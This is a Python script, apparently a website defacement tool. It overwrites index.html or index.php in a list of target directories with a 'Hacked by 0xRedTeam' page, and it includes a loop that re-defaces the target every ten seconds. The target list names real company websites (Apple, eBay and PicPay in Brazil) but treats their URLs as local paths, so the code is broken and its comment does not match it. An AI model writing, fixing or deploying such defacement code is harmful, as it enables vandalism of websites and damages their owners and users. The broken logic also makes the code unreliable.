import os 

def get_web_dirs():
    # Common web directories on Linux 
    dirs = ["https://www.apple.com/br/imac/", "https://br.ebay.com/","https://picpay.com/"]
    return [d for d in dirs if os.path.exists(d)]

def deface_site(path, payload):
    index_files = ["index.html", "index.php"]
    for fname in index_files:
        fpath = os.path.join(path, fname)
        if os.path.exists(fpath):
            try:
                with open(fpath, "w") as f:
                    f.write(payload)
                    print(f"[+] Defaced: {fpath}")
            except Exception as e:
                print(f"[-] Failed: {fpath}({e})")

def main():
    payload = """

    <html>

    <head><title>Hacked!</title></head>
    <body style='background:black; color:lime; text-align:center;'>
    <h1>Hacked by 0xRedTeam</h1>
    <p>System Pwned. Respect the hackers.</p>
    </body>
    </html>
    """


    web_dirs = get_web_dirs()
    for wdir in web_dirs:
        deface_site(wdir, payload)
    

if __name__=="__main__":
    main()

import time

def persistent_loop(target, payload):
    
    while True:

        with open(target, 'w') as f:
        
            f.write(payload)
        
        print(f"[+] Re-defaced: {target}")

        time.sleep(10) # Rewrites every 10 seconds





        
